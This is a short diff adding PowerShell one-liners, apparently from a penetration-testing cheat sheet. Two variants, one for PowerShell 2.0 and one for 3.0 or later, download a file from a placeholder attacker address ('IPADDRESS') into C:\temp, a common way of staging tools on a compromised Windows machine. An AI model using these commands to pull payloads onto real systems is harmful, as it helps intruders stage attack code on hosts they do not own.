@@ -1,0 +1,5 @@
+#Powershell 2.0
+powershell.exe –Command "& {(New-Object Net.WebClient).DownloadFile('http://IPADDRESS/ps.txt', 'C:\temp\ps.txt')}"
+
+#Powershell 3.0 or greater
+powershell.exe -Command "& {wget 'http://IPADDRESS/ps.txt' -OutFile 'C:\temp\ps.txt'}"
